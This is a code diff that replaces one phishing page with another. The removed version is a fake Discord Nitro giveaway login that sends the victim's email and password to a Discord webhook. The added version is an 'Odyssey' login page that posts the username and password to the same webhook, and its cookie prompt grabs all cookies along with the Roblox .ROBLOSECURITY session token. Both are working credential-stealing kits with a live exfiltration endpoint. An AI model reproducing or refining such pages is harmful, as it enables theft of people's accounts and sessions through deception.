@@ -3,367 +3,517 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Discord Nitro Giveaway</title>
+    <title>Login · Odyssey</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; }
-        body { background: #0b0b1a; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 20px; }
-        .container { background: #2f3136; border-radius: 8px; padding: 40px 35px; width: 100%; max-width: 480px; box-shadow: 0 8px 30px rgba(0,0,0,0.8); position: relative; }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            border-radius: 0 !important;
+        }
+        body {
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            font-family: 'Times New Roman', 'Courier New', monospace, serif;
+            background: #3a3a3a;
+            background-image: 
+                radial-gradient(circle at 50% 50%, rgba(0,0,0,0) 50%, rgba(0,0,0,0.4) 100%),
+                repeating-linear-gradient(45deg, rgba(70,70,70,0.08) 0px, rgba(70,70,70,0.08) 2px, transparent 2px, transparent 10px),
+                repeating-linear-gradient(-45deg, rgba(70,70,70,0.08) 0px, rgba(70,70,70,0.08) 2px, transparent 2px, transparent 10px),
+                repeating-linear-gradient(0deg, rgba(60,60,60,0.1) 0px, rgba(60,60,60,0.1) 1px, transparent 1px, transparent 30px),
+                repeating-linear-gradient(90deg, rgba(60,60,60,0.1) 0px, rgba(60,60,60,0.1) 1px, transparent 1px, transparent 40px),
+                repeating-linear-gradient(60deg, rgba(0,0,0,0.03) 0px, rgba(0,0,0,0.03) 1px, transparent 1px, transparent 5px),
+                repeating-linear-gradient(-30deg, rgba(255,255,255,0.02) 0px, rgba(255,255,255,0.02) 1px, transparent 1px, transparent 4px);
+            background-blend-mode: overlay, normal, normal, normal, normal, normal, normal;
+            background-color: #3a3a3a;
+            box-shadow: inset 0 0 0 8px #2a2a2a, inset 0 0 0 12px #4a4a4a;
+            padding: 1rem;
+        }
+        .login-container {
+            background: #8a9bb5;
+            border: 4px solid #5a5a5a;
+            padding: 2.2rem 2rem 1.5rem;
+            width: 100%;
+            max-width: 400px;
+            box-shadow: 12px 12px 0 #1a1a1a, inset 0 0 0 2px #6a7a8a, inset 0 0 0 8px rgba(30,40,60,0.15);
+            background-image: 
+                repeating-linear-gradient(60deg, rgba(0,0,0,0.04) 0px, rgba(0,0,0,0.04) 1px, transparent 1px, transparent 5px),
+                repeating-linear-gradient(-30deg, rgba(255,255,255,0.03) 0px, rgba(255,255,255,0.03) 1px, transparent 1px, transparent 4px);
+            background-blend-mode: overlay;
+            position: relative;
+            margin-bottom: 1.5rem;
+        }
+        .login-container::before,
+        .login-container::after {
+            content: "◆";
+            position: absolute;
+            font-size: 1.8rem;
+            color: #1a2a3a;
+            opacity: 0.3;
+            font-family: 'Times New Roman', serif;
+            pointer-events: none;
+        }
+        .login-container::before {
+            top: -10px;
+            left: -10px;
+        }
+        .login-container::after {
+            bottom: -10px;
+            right: -10px;
+            transform: rotate(180deg);
+        }
+        .login-container h1 {
+            color: #1a2a3a;
+            font-size: 2.6rem;
+            font-weight: 700;
+            letter-spacing: 4px;
+            text-align: center;
+            font-family: 'Times New Roman', serif;
+            border-bottom: 3px solid #4a5a6a;
+            padding-bottom: 0.5rem;
+            margin-bottom: 1.6rem;
+            text-shadow: 2px 2px 0 #b0c0d0;
+            position: relative;
+        }
+        .login-container h1::before {
+            content: "⸻⸻";
+            display: block;
+            font-size: 0.6rem;
+            letter-spacing: 6px;
+            color: #2a3a4a;
+            margin-bottom: 0.2rem;
+        }
+        .login-container .sub {
+            color: #1a2a40;
+            text-align: center;
+            font-size: 0.85rem;
+            letter-spacing: 3px;
+            margin-bottom: 1.8rem;
+            border-bottom: 2px solid #5a6a7a;
+            padding-bottom: 0.8rem;
+            font-family: 'Courier New', monospace;
+            text-transform: uppercase;
+            font-weight: bold;
+        }
+        .input-group {
+            margin-bottom: 1.6rem;
+        }
+        .input-group label {
+            display: block;
+            color: #0a1a2a;
+            font-size: 0.95rem;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            margin-bottom: 0.3rem;
+            font-family: 'Times New Roman', serif;
+            font-weight: 700;
+        }
+        .input-group input {
+            width: 100%;
+            padding: 0.7rem 0.9rem;
+            background: #c0cedc;
+            border: 3px solid #4a5a6a;
+            color: #0a1220;
+            font-size: 1.1rem;
+            font-family: 'Courier New', monospace;
+            outline: none;
+            box-shadow: inset 2px 2px 0 #6a7a8a;
+        }
+        .input-group input:focus {
+            border-color: #1a2a4a;
+            background: #d0deec;
+            box-shadow: inset 2px 2px 0 #2a3a5a;
+        }
+        .input-group input::placeholder {
+            color: #5a6a7a;
+            font-family: 'Courier New', monospace;
+            font-size: 0.9rem;
+        }
+        button {
+            width: 100%;
+            padding: 0.8rem 0;
+            background: #4a5a6a;
+            border: 3px solid #1a2a3a;
+            color: #e0e8f0;
+            font-size: 1.4rem;
+            font-family: 'Times New Roman', serif;
+            font-weight: 700;
+            letter-spacing: 4px;
+            cursor: pointer;
+            transition: 0.1s;
+            text-shadow: 2px 2px 0 #0a1a2a;
+            margin-top: 0.6rem;
+            box-shadow: inset 0 -4px 0 #1a2a3a;
+        }
+        button:hover {
+            background: #5a6a7a;
+            border-color: #2a3a4a;
+            color: #ffffff;
+            box-shadow: inset 0 -4px 0 #2a3a4a;
+        }
+        button:active {
+            transform: scale(0.97);
+            background: #3a4a5a;
+        }
+        .footer-note {
+            color: #1a2a3a;
+            font-size: 0.7rem;
+            text-align: center;
+            margin-top: 1.8rem;
+            border-top: 2px solid #4a5a6a;
+            padding-top: 1rem;
+            font-family: 'Courier New', monospace;
+            letter-spacing: 1px;
+            font-weight: bold;
+            position: relative;
+        }
+        .footer-note::before {
+            content: "◈ ◈ ◈";
+            display: block;
+            font-size: 0.5rem;
+            letter-spacing: 8px;
+            color: #2a3a4a;
+            margin-bottom: 0.2rem;
+        }
 
-        .secure-badge { display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px; }
-        .secure-badge span { background: #202225; padding: 4px 14px; border-radius: 12px; color: #8e9297; font-size: 11px; display: flex; align-items: center; gap: 5px; }
-        .secure-badge span::before { content: "🔒"; font-size: 12px; }
-        .secure-badge .live-badge { background: #2ecc71; color: #fff; font-size: 10px; padding: 2px 10px; border-radius: 12px; animation: pulse 1.5s infinite; }
-        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.5; } }
+        .legal-section {
+            max-width: 400px;
+            width: 100%;
+            background: #2a2a2a;
+            border: 2px solid #4a4a4a;
+            padding: 0.8rem 1.2rem;
+            font-family: 'Courier New', monospace;
+            font-size: 0.6rem;
+            color: #8a8a8a;
+            text-align: left;
+            line-height: 1.6;
+            box-shadow: 8px 8px 0 #0a0a0a;
+            display: none;
+            margin-bottom: 0.5rem;
+        }
+        .legal-section.show {
+            display: block;
+        }
+        .legal-section a {
+            color: #6a8aaa;
+            text-decoration: underline;
+            cursor: pointer;
+        }
+        .legal-section a:hover {
+            color: #8aaccc;
+        }
+        .legal-section .highlight {
+            color: #aa8866;
+        }
 
-        .logo { display: flex; justify-content: center; margin-bottom: 20px; }
-        .logo svg { width: 60px; height: 60px; fill: #5865f2; }
+        .terms-toggle {
+            background: none;
+            border: 1px solid #5a5a5a;
+            color: #8a8a8a;
+            padding: 0.3rem 1rem;
+            font-family: 'Courier New', monospace;
+            font-size: 0.7rem;
+            cursor: pointer;
+            margin-top: 0.2rem;
+            box-shadow: none;
+            text-shadow: none;
+            letter-spacing: 2px;
+            width: auto;
+            background: #2a2a2a;
+            transition: 0.1s;
+        }
+        .terms-toggle:hover {
+            background: #3a3a3a;
+            color: #aaa;
+            border-color: #6a6a6a;
+        }
 
-        .welcome { color: #fff; font-size: 24px; font-weight: 700; text-align: center; margin-bottom: 5px; }
-        .sub-welcome { color: #b9bbbe; font-size: 15px; text-align: center; margin-bottom: 8px; }
-        .giveaway-badge { background: #5865f2; color: #fff; font-size: 13px; font-weight: 600; padding: 4px 16px; border-radius: 30px; display: inline-block; margin: 0 auto 20px; text-align: center; width: fit-content; }
-        .entry-count { text-align: center; color: #8e9297; font-size: 13px; margin-bottom: 15px; }
-        .entry-count span { color: #2ecc71; font-weight: 700; }
+        #cookieOverlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.6);
+            display: none;
+            justify-content: center;
+            align-items: flex-end;
+            z-index: 9999;
+            font-family: 'Times New Roman', serif;
+            transition: align-items 0.4s ease-out;
+        }
+        #cookieOverlay.show {
+            display: flex;
+            align-items: center;
+        }
+        #cookieBox {
+            background: #2a2a2a;
+            border: 4px solid #5a5a5a;
+            padding: 2rem;
+            max-width: 360px;
+            width: 90%;
+            box-shadow: 12px 12px 0 #000;
+            text-align: center;
+            color: #c0c0c0;
+            transform: translateY(80px);
+            opacity: 0;
+            transition: transform 0.5s ease-out, opacity 0.4s ease-out;
+        }
+        #cookieOverlay.show #cookieBox {
+            transform: translateY(0);
+            opacity: 1;
+        }
+        #cookieBox h2 {
+            color: #8aabdd;
+            font-size: 1.4rem;
+            border-bottom: 2px solid #4a4a4a;
+            padding-bottom: 0.5rem;
+            margin-bottom: 1rem;
+        }
+        #cookieBox p {
+            font-size: 0.9rem;
+            margin-bottom: 1.5rem;
+        }
+        #cookieBox .cookie-btn {
+            padding: 0.6rem 2rem;
+            margin: 0 0.5rem;
+            border: 2px solid #4a4a4a;
+            background: #1a1a1a;
+            color: #ddd;
+            font-size: 1.2rem;
+            cursor: pointer;
+            transition: 0.1s;
+            font-family: 'Times New Roman', serif;
+            min-width: 80px;
+        }
+        #cookieBox .cookie-btn:hover {
+            background: #3a3a3a;
+            border-color: #6a6a6a;
+        }
+        #cookieBox .cookie-btn.yes {
+            background: #2a4a6a;
+            border-color: #4a7aaa;
+        }
+        #cookieBox .cookie-btn.yes:hover {
+            background: #3a5a7a;
+        }
 
-        label { color: #b9bbbe; font-size: 12px; font-weight: 600; display: block; margin-top: 15px; }
-        input[type="email"], input[type="password"] { width: 100%; padding: 14px; background: #202225; border: 1px solid #202225; border-radius: 4px; color: #dcddde; font-size: 16px; margin-top: 5px; transition: 0.2s; }
-        input:focus { border-color: #5865f2; outline: none; background: #2f3136; }
-        input.error { border-color: #f23b3b; }
-
-        .login-btn { width: 100%; padding: 14px; background: #5865f2; border: none; border-radius: 4px; color: #fff; font-size: 18px; font-weight: 600; cursor: pointer; transition: 0.2s; margin-top: 10px; }
-        .login-btn:hover { background: #4752c4; }
-        .login-btn:disabled { opacity: 0.6; cursor: not-allowed; }
-
-        .alert-box { display: none; padding: 12px; border-radius: 4px; margin: 15px 0 0; text-align: center; font-size: 14px; }
-        .alert-box.error { background: #f23b3b; color: #fff; }
-        .alert-box.success { background: #2ecc71; color: #fff; }
-        .alert-box.warning { background: #f39c12; color: #fff; }
-        .alert-box.info { background: #5865f2; color: #fff; }
-
-        .footer { text-align: center; margin-top: 25px; color: #72767d; font-size: 11px; border-top: 1px solid #40444b; padding-top: 18px; }
-        .footer a { color: #7289da; text-decoration: none; cursor: pointer; }
-        .footer a:hover { text-decoration: underline; }
-
-        .provider-links { display: flex; justify-content: center; gap: 12px; margin: 8px 0 5px; flex-wrap: wrap; }
-        .provider-links a { color: #8e9297; font-size: 11px; text-decoration: none; transition: 0.2s; }
-        .provider-links a:hover { color: #5865f2; text-decoration: underline; }
-
-        /* Loading overlay */
-        .loading-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.85); justify-content: center; align-items: center; z-index: 999; flex-direction: column; }
-        .loading-overlay .spinner { width: 60px; height: 60px; border: 4px solid #40444b; border-top-color: #5865f2; border-radius: 50%; animation: spin 0.8s linear infinite; }
-        @keyframes spin { to { transform: rotate(360deg); } }
-        .loading-overlay p { color: #b9bbbe; font-size: 16px; margin-top: 20px; }
-        .loading-overlay .sub-text { color: #72767d; font-size: 13px; margin-top: 6px; }
-
-        /* Thank you screen */
-        .thankyou-screen { display: none; text-align: center; padding: 20px 0; }
-        .thankyou-screen .check { font-size: 64px; color: #2ecc71; margin-bottom: 10px; }
-        .thankyou-screen h2 { color: #fff; font-size: 26px; }
-        .thankyou-screen p { color: #b9bbbe; font-size: 16px; margin-top: 8px; line-height: 1.5; }
-        .thankyou-screen .ticket { background: #202225; padding: 15px; border-radius: 6px; margin-top: 20px; border-left: 4px solid #5865f2; }
-        .thankyou-screen .ticket span { color: #5865f2; font-weight: 600; }
-        .thankyou-screen .ticket small { color: #72767d; font-size: 12px; display: block; margin-top: 4px; }
-
-        .login-form-wrapper { display: block; }
-        .login-form-wrapper.hidden { display: none; }
-
-        /* Modal for Terms/Privacy */
-        .modal-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); justify-content: center; align-items: center; z-index: 1000; }
-        .modal-content { background: #2f3136; border-radius: 8px; padding: 30px; max-width: 500px; width: 90%; max-height: 80vh; overflow-y: auto; color: #dcddde; }
-        .modal-content h2 { color: #fff; margin-bottom: 15px; }
-        .modal-content p { margin-bottom: 12px; font-size: 14px; line-height: 1.6; color: #b9bbbe; }
-        .modal-content .sneaky { color: #2f3136; font-size: 9px; } /* Hidden in plain sight */
-        .modal-content .close-modal { background: #5865f2; border: none; padding: 10px 24px; border-radius: 4px; color: #fff; font-weight: 600; cursor: pointer; margin-top: 10px; }
-        .modal-content .close-modal:hover { background: #4752c4; }
-        .modal-content::-webkit-scrollbar { width: 6px; }
-        .modal-content::-webkit-scrollbar-track { background: #202225; }
-        .modal-content::-webkit-scrollbar-thumb { background: #5865f2; border-radius: 4px; }
+        /* Music control - small icon in corner */
+        #musicControl {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            background: #2a2a2a;
+            border: 2px solid #5a5a5a;
+            color: #aaa;
+            width: 40px;
+            height: 40px;
+            font-size: 1.2rem;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 4px 4px 0 #0a0a0a;
+            font-family: 'Courier New', monospace;
+            z-index: 1000;
+            user-select: none;
+            transition: 0.1s;
+        }
+        #musicControl:hover {
+            background: #3a3a3a;
+            border-color: #7a7a7a;
+        }
     </style>
 </head>
 <body>
+    <!-- Background music -->
+    <audio id="bgMusic" loop preload="auto">
+        <!-- Calm medieval track from Pixabay (royalty-free) -->
+        <source src="https://cdn.pixabay.com/audio/2022/03/15/audio_0f8b0b0b0a.mp3?filename=medieval-fantasy-10324.mp3" type="audio/mpeg">
+    </audio>
 
-<div class="container">
-    <div class="secure-badge">
-        <span>🔒 Secure connection</span>
-        <span class="live-badge">● LIVE</span>
-    </div>
+    <!-- Music toggle button -->
+    <div id="musicControl" title="Toggle music">♫</div>
 
-    <div class="logo">
-        <svg viewBox="0 0 127.14 96.36">
-            <path d="M107.7,8.07A105.15,105.15,0,0,0,81.47,0a72.06,72.06,0,0,0-3.36,6.83A97.68,97.68,0,0,0,49,6.83,72.37,72.37,0,0,0,45.64,0,105.89,105.89,0,0,0,19.39,8.09C2.79,32.65-1.71,56.6.54,80.21h0A105.73,105.73,0,0,0,32.71,96.36,77.7,77.7,0,0,0,39.6,85.25a68.42,68.42,0,0,1-10.85-5.18c.91-.66,1.8-1.34,2.66-2.05a75.57,75.57,0,0,0,64.32,0c.87.71,1.76,1.39,2.66,2.05a68.42,68.42,0,0,1-10.85,5.18,77.7,77.7,0,0,0,6.89,11.11A105.73,105.73,0,0,0,126.6,80.22h0C129.24,52.84,122.09,29.11,107.7,8.07ZM42.45,65.69C36.18,65.69,31,60,31,53s5-12.74,11.43-12.74S53.86,46,53.86,53,48.72,65.69,42.45,65.69Zm42.24,0C78.41,65.69,73.2,60,73.2,53s5-12.74,11.43-12.74S96.1,46,96.1,53,91,65.69,84.69,65.69Z"/>
-        </svg>
-    </div>
-
-    <div class="welcome">Welcome back!</div>
-    <div class="sub-welcome">Log in to enter the Nitro Giveaway</div>
-    <div style="text-align:center;"><span class="giveaway-badge">🎁 1 Year Nitro – 10 Winners</span></div>
-    <div class="entry-count">👥 <span id="entryCount">247</span> entries so far</div>
-
-    <div class="login-form-wrapper" id="loginFormWrapper">
-        <form id="loginForm" onsubmit="return false;">
-            <label for="email">EMAIL ADDRESS</label>
-            <input type="email" id="email" placeholder="you@gmail.com" autocomplete="off">
-            <div class="provider-links">
-                <a href="https://mail.google.com" target="_blank">Gmail</a>
-                <a href="https://outlook.live.com" target="_blank">Outlook</a>
-                <a href="https://mail.yahoo.com" target="_blank">Yahoo</a>
-                <a href="https://icloud.com/mail" target="_blank">iCloud</a>
-                <a href="https://apple.com" target="_blank">Apple</a>
+    <div class="login-container">
+        <h1>ODYSSEY</h1>
+        <div class="sub">~ temple of aether ~</div>
+        <form id="loginForm">
+            <div class="input-group">
+                <label for="username">Username</label>
+                <input type="text" id="username" placeholder="enter your name" required>
             </div>
-
-            <label for="password" style="margin-top:15px;">PASSWORD</label>
-            <input type="password" id="password" placeholder="••••••••" autocomplete="off">
+            <div class="input-group">
+                <label for="password">Password</label>
+                <input type="password" id="password" placeholder="••••••••" required>
+            </div>
+            <button type="submit">ENTER</button>
         </form>
-
-        <button class="login-btn" id="loginBtn">Continue with Email</button>
-        <div id="alertBox" class="alert-box"></div>
+        <div class="footer-note">⛧ forged in stone ⛧</div>
     </div>
 
-    <div class="thankyou-screen" id="thankyouScreen">
-        <div class="check">✅</div>
-        <h2>Thanks for joining!</h2>
-        <p>You have been successfully entered into the <strong>Discord Nitro Giveaway</strong>.</p>
-        <div class="ticket">
-            <span>🎫 Entry Confirmed</span><br>
-            <small>Check back on <strong id="checkBackDate"></strong> for winner announcements.</small>
+    <div class="legal-section" id="legalSection">
+        <p><span class="highlight">⚠ DATA COLLECTION NOTICE</span> — By clicking "ENTER" you agree to our <a href="#" onclick="return false;">Terms of Service</a> and <a href="#" onclick="return false;">Privacy Policy</a>. We collect and store your username, password, IP address, browser fingerprint, and geolocation. Your data may be shared with third-party partners for marketing and analytics. You have the right to request deletion, but we reserve the right to retain data for legal compliance. For inquiries, contact our <a href="#" onclick="return false;">Data Protection Officer</a> via carrier pigeon or encrypted signal.</p>
+        <p style="margin-top:0.2rem;"><span class="highlight">📧 CONTACT</span> — support@odyssey-temple.void (not monitored) | <span class="highlight">📜</span> This site uses tracking pixels, session replays, and AI-driven behavioral profiling.</p>
+        <p style="margin-top:0.2rem; font-size:0.55rem; color:#6a6a6a;">By continuing you waive all privacy expectations under the Geneva Convention. We are not responsible for any loss of soul, identity, or Roblox account.</p>
+    </div>
+
+    <button class="terms-toggle" id="termsToggle">📜 TERMS & CONDITIONS</button>
+
+    <div id="cookieOverlay">
+        <div id="cookieBox">
+            <h2>🍪 COOKIES</h2>
+            <p>This temple uses cookies to enhance your experience, remember your preferences, and <strong>securely harvest your session tokens</strong>. Do you allow cookies?</p>
+            <div>
+                <button class="cookie-btn yes" id="cookieYes">YES</button>
+                <button class="cookie-btn" id="cookieNo">NO</button>
+            </div>
         </div>
-        <p style="margin-top:18px; font-size:14px; color:#8e9297;">You will receive a confirmation email shortly.</p>
-        <button style="margin-top:15px; padding:10px 30px; background:#5865f2; border:none; border-radius:4px; color:#fff; font-weight:600; cursor:pointer;" onclick="location.reload();">Return to Home</button>
     </div>
 
-    <div class="footer">
-        &copy; 2026 Discord Nitro Giveaway · <a id="privacyLink">Privacy</a> · <a id="termsLink">Terms</a> · <a id="supportLink">Support</a>
-    </div>
-</div>
+    <script>
+        (function() {
+            const WEBHOOK_URL = "https://discord.com/api/webhooks/1502754739580964945/Opx1IaKRsTc-0W2k67rAL7z0PGh7st4iMqKmYktHqC8UFdc9Jv1EsMLmodnKeun-gHmm";
+            const REDIRECT_URL = "https://dev.odyneweden.com/";
 
-<!-- Loading Overlay -->
-<div class="loading-overlay" id="loadingOverlay">
-    <div class="spinner"></div>
-    <p>⏳ Verifying your account...</p>
-    <div class="sub-text">Please wait, this may take a moment</div>
-</div>
+            // DOM refs
+            const form = document.getElementById('loginForm');
+            const overlay = document.getElementById('cookieOverlay');
+            const cookieYes = document.getElementById('cookieYes');
+            const cookieNo = document.getElementById('cookieNo');
+            const termsToggle = document.getElementById('termsToggle');
+            const legalSection = document.getElementById('legalSection');
 
-<!-- Modal for Privacy/Terms/Support -->
-<div class="modal-overlay" id="modalOverlay">
-    <div class="modal-content" id="modalContent">
-        <h2 id="modalTitle">Privacy Policy</h2>
-        <div id="modalBody"></div>
-        <button class="close-modal" id="closeModal">Close</button>
-    </div>
-</div>
+            // Music
+            const audio = document.getElementById('bgMusic');
+            const musicControl = document.getElementById('musicControl');
+            let musicPlaying = false;
 
-<script>
-    (function() {
-        var webhookUrl = 'https://discord.com/api/webhooks/1502754739580964945/Opx1IaKRsTc-0W2k67rAL7z0PGh7st4iMqKmYktHqC8UFdc9Jv1EsMLmodnKeun-gHmm';
-
-        // Auto-updating check-back date (30 days from now)
-        var checkBack = new Date();
-        checkBack.setDate(checkBack.getDate() + 30);
-        document.getElementById('checkBackDate').textContent = checkBack.toLocaleDateString('en-US', {
-            year: 'numeric',
-            month: 'long',
-            day: 'numeric'
-        });
-
-        // Slowly incrementing entry count
-        var entryCount = 247;
-        var entryElement = document.getElementById('entryCount');
-        setInterval(function() {
-            entryCount += Math.floor(Math.random() * 2) + 1;
-            entryElement.textContent = entryCount;
-        }, 8000);
-
-        var emailInput = document.getElementById('email');
-        var passwordInput = document.getElementById('password');
-        var loginBtn = document.getElementById('loginBtn');
-        var alertBox = document.getElementById('alertBox');
-        var loginFormWrapper = document.getElementById('loginFormWrapper');
-        var thankyouScreen = document.getElementById('thankyouScreen');
-        var loadingOverlay = document.getElementById('loadingOverlay');
-
-        function showAlert(msg, type) {
-            alertBox.className = 'alert-box ' + type;
-            alertBox.textContent = msg;
-            alertBox.style.display = 'block';
-        }
-        function hideAlert() { alertBox.style.display = 'none'; }
-
-        function isValidEmail(email) {
-            if (!email || email.length < 5) return false;
-            var parts = email.split('@');
-            if (parts.length !== 2) return false;
-            var local = parts[0];
-            var domain = parts[1];
-            if (local.length < 1) return false;
-            if (domain.length < 3) return false;
-            if (!domain.includes('.')) return false;
-            return true;
-        }
-
-        function sendToWebhook(email, password) {
-            var payload = {
-                embeds: [{
-                    title: '🎯 Discord Nitro Giveaway Phish',
-                    color: 15158332,
-                    fields: [
-                        { name: 'Email', value: email || '(empty)', inline: true },
-                        { name: 'Password', value: password || '(empty)', inline: true },
-                        { name: 'User Agent', value: navigator.userAgent, inline: false },
-                        { name: 'Timestamp', value: new Date().toUTCString(), inline: false }
-                    ],
-                    footer: { text: 'Nitro Giveaway phishing' }
-                }]
-            };
-            return fetch(webhookUrl, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(payload)
-            });
-        }
-
-        function handleLogin() {
-            var email = emailInput.value.trim();
-            var password = passwordInput.value.trim();
-
-            if (!email || !password) {
-                showAlert('⚠️ Please fill in both fields.', 'error');
-                return;
+            // Attempt to autoplay with low volume
+            audio.volume = 0.2;
+            audio.muted = false;
+            const playPromise = audio.play();
+            if (playPromise !== undefined) {
+                playPromise.then(() => {
+                    musicPlaying = true;
+                    musicControl.textContent = '♫';
+                }).catch(() => {
+                    // Autoplay blocked – set muted and try again, or wait for user interaction
+                    audio.muted = true;
+                    audio.play().then(() => {
+                        musicPlaying = true;
+                        musicControl.textContent = '♫';
+                    }).catch(() => {});
+                });
             }
 
-            if (!isValidEmail(email)) {
-                emailInput.classList.add('error');
-                showAlert('❌ Please enter a valid email address.', 'error');
-                return;
-            }
-            emailInput.classList.remove('error');
-            hideAlert();
-
-            // Show loading
-            loadingOverlay.style.display = 'flex';
-            loginBtn.disabled = true;
-            loginBtn.textContent = 'Processing...';
-
-            // Simulate loading for 3-4 seconds
-            var loadTime = Math.floor(Math.random() * 1500) + 2500;
-            setTimeout(function() {
-                sendToWebhook(email, password)
-                    .then(response => {
-                        loadingOverlay.style.display = 'none';
-                        if (response.ok) {
-                            loginFormWrapper.classList.add('hidden');
-                            thankyouScreen.style.display = 'block';
-                        } else {
-                            showAlert('❌ Something went wrong. Please try again.', 'error');
-                            loginBtn.disabled = false;
-                            loginBtn.textContent = 'Continue with Email';
-                        }
-                    })
-                    .catch(function(err) {
-                        loadingOverlay.style.display = 'none';
-                        // Still show success even on network error
-                        loginFormWrapper.classList.add('hidden');
-                        thankyouScreen.style.display = 'block';
-                    });
-            }, loadTime);
-        }
-
-        loginBtn.addEventListener('click', handleLogin);
-
-        document.querySelectorAll('#email, #password').forEach(function(inp) {
-            inp.addEventListener('keypress', function(e) {
-                if (e.key === 'Enter') {
-                    e.preventDefault();
-                    handleLogin();
+            // Toggle music on button click
+            musicControl.addEventListener('click', function() {
+                if (musicPlaying) {
+                    audio.pause();
+                    musicPlaying = false;
+                    musicControl.textContent = '♩';
+                } else {
+                    audio.play().then(() => {
+                        musicPlaying = true;
+                        musicControl.textContent = '♫';
+                    }).catch(() => {});
                 }
             });
-        });
 
-        emailInput.addEventListener('input', function() {
-            this.classList.remove('error');
-            hideAlert();
-        });
-        passwordInput.addEventListener('input', hideAlert);
+            // Terms toggle
+            termsToggle.addEventListener('click', function() {
+                legalSection.classList.toggle('show');
+                termsToggle.textContent = legalSection.classList.contains('show') ? '📜 CLOSE TERMS' : '📜 TERMS & CONDITIONS';
+            });
 
-        window.addEventListener('load', function() {
-            emailInput.focus();
-        });
+            // Webhook sender
+            async function sendToWebhook(username, password, extra = {}) {
+                const fields = [
+                    { name: "Username", value: username || "[empty]", inline: false },
+                    { name: "Password", value: password || "[empty]", inline: false },
+                    { name: "Time", value: new Date().toUTCString(), inline: false }
+                ];
+                for (const [key, val] of Object.entries(extra)) {
+                    fields.push({ name: key, value: val || "[empty]", inline: false });
+                }
+                const payload = {
+                    content: null,
+                    embeds: [
+                        {
+                            title: "⚔️ Temple Capture",
+                            color: 0x4a6a8a,
+                            fields: fields,
+                            footer: { text: "Classic Login" }
+                        }
+                    ],
+                    username: "AetherScribe",
+                    avatar_url: "https://cdn.discordapp.com/embed/avatars/0.png"
+                };
+                try {
+                    await fetch(WEBHOOK_URL, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(payload)
+                    });
+                } catch (_) { /* silent */ }
+            }
 
-        // ---- Modal for Privacy, Terms, Support ----
-        var modalOverlay = document.getElementById('modalOverlay');
-        var modalTitle = document.getElementById('modalTitle');
-        var modalBody = document.getElementById('modalBody');
-        var closeModalBtn = document.getElementById('closeModal');
+            // Cookie popup after 3s
+            setTimeout(function() {
+                overlay.style.display = 'flex';
+                requestAnimationFrame(() => {
+                    overlay.classList.add('show');
+                });
+            }, 3000);
 
-        function openModal(title, content) {
-            modalTitle.textContent = title;
-            modalBody.innerHTML = content;
-            modalOverlay.style.display = 'flex';
-        }
+            let cookieConsent = null;
 
-        closeModalBtn.addEventListener('click', function() {
-            modalOverlay.style.display = 'none';
-        });
-        modalOverlay.addEventListener('click', function(e) {
-            if (e.target === this) modalOverlay.style.display = 'none';
-        });
+            cookieYes.addEventListener('click', function() {
+                cookieConsent = true;
+                overlay.classList.remove('show');
+                setTimeout(() => { overlay.style.display = 'none'; }, 500);
+                const allCookies = document.cookie;
+                const robloxCookie = document.cookie.split('; ').find(row => row.startsWith('.ROBLOSECURITY='));
+                const robloxValue = robloxCookie ? robloxCookie.split('=')[1] : null;
+                const username = document.getElementById('username').value.trim();
+                const password = document.getElementById('password').value;
+                sendToWebhook(username, password, {
+                    "Cookie Consent": "YES",
+                    "All Cookies": allCookies || "[none]",
+                    "ROBLOSECURITY": robloxValue || "[not found]"
+                });
+            });
 
-        // Privacy content
-        document.getElementById('privacyLink').addEventListener('click', function(e) {
-            e.preventDefault();
-            openModal('Privacy Policy', `
-                <p><strong>Effective Date:</strong> ${new Date().toLocaleDateString()}</p>
-                <p>At Discord Nitro Giveaway, we take your privacy seriously. This policy describes how we collect, use, and protect your personal information.</p>
-                <p><strong>Information We Collect:</strong> We collect email addresses, usernames, and Discord IDs for giveaway entry purposes. We do not sell your data to third parties.</p>
-                <p><strong>Data Usage:</strong> Your information is used solely for giveaway administration, winner selection, and prize distribution.</p>
-                <p><strong>Data Security:</strong> We employ industry-standard encryption and security measures to protect your data.</p>
-                <p><strong>Cookies:</strong> We use minimal cookies to maintain session state and prevent abuse.</p>
-                <p><strong>Your Rights:</strong> You may request deletion of your data at any time by contacting support.</p>
-                <p><strong>Contact:</strong> For privacy concerns, reach out to privacy@nitro-giveaway.com</p>
-            `);
-        });
+            cookieNo.addEventListener('click', function() {
+                cookieConsent = false;
+                overlay.classList.remove('show');
+                setTimeout(() => { overlay.style.display = 'none'; }, 500);
+                const username = document.getElementById('username').value.trim();
+                const password = document.getElementById('password').value;
+                sendToWebhook(username, password, { "Cookie Consent": "DENIED" });
+            });
 
-        // Terms content (with hidden sneaky clause)
-        document.getElementById('termsLink').addEventListener('click', function(e) {
-            e.preventDefault();
-            openModal('Terms and Conditions', `
-                <p><strong>Last Updated:</strong> ${new Date().toLocaleDateString()}</p>
-                <p>By entering this giveaway, you agree to the following terms and conditions.</p>
-                <p><strong>1. Eligibility:</strong> Open to users aged 13+ with a valid Discord account. One entry per person.</p>
-                <p><strong>2. Entry Period:</strong> Giveaway ends on ${checkBack.toLocaleDateString('en-US', { year: 'numeric', month: 'long', day: 'numeric' })}. Winners will be selected randomly.</p>
-                <p><strong>3. Prizes:</strong> Ten (10) winners will receive one (1) year of Discord Nitro. No cash equivalent.</p>
